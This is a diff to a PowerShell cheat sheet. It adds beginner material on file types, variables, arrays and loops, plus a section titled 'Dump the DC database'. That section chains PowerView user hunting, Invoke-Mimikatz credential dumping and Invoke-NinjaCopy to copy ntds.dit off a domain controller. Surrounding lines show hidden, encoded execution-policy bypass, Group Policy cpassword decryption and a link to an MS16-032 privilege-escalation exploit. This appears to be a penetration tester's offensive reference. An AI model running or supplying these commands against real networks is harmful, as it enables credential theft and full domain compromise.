@@ -1,6 +1,59 @@
 PowerShell
 
 
+# File types
+script file			    .ps1
+script data file		.psd1
+script module file	.psm1
+
+# Vocabulary
+string - Any combination of letters and numbers that are surrounded by quotes. Used for printing stuff.
+integer - A number without quotes. Used for math.
+boolean - True or false, represented as $True or $False.
+variable - A value that can be assigned over the course of a script.
+
+# Objects
+PS C:\> $a = "apple" 
+PS C:\> $a.Length
+5
+PS C:\> $a.ToUpper()
+APPLE
+
+# Arrays
+PS C:\> $list = "red", "white", "blue"
+PS C:\> $list[0]
+red
+PS C:\> $list[2]
+blue
+
+# CMDLETS
+Uses a 'verb-noun' format.
+Get-Date
+Get-Process
+
+# For loops
+$list = "one", "two", "three"
+forEach ($item in $list){
+	write-host = $item
+}
+
+$dirs = Get-ChildItem C:\
+forEach ($dir in $dirs){
+	write-host $dir.FullName
+	write-host "-----"
+	$acl = $dir.GetAccessControl()
+	write-host $acl.AccessToString
+	write-host
+}
+
+# While loops
+$i = 1
+while ($i -le 5){
+	write-host $i
+	$i = $i + 1
+}
+------------------------------------------------------------------------------------------------------
+
 C:\> powershell.exe -exec bypass        Start PowerShell bypass execution policy.
 C:\> powershell.exe -NoP -sta -NonI -W Hidden -Enc <code>
 
@@ -97,8 +150,22 @@ Search xml files for cpassword.
 PS C:\> GetDecryptedCpassword 'AES 256-bit encrypted password'
 ------------------------------------------------------------------------------------------------------
 
+# Dump the DC database
+
+PS C:\> Import-Module PowerView
+PS C:\> Invoke-UserHunter
+PS C:\> import-Module PowerSploit
+PS C:\> Invoke-Mimikatz -ComputerName <name>
+
+Open a new PS window as Administrator.
+Use the creds you just found.
+
+PS C:\> Import-Module PowerView
+PS C:\> Get-NetDomainController
+PS C:\> Import-Module PowerSploit
+PS C:\> Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
+PS C:\> ls
+------------------------------------------------------------------------------------------------------
+
 # MS16-032
 https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
-
-
-
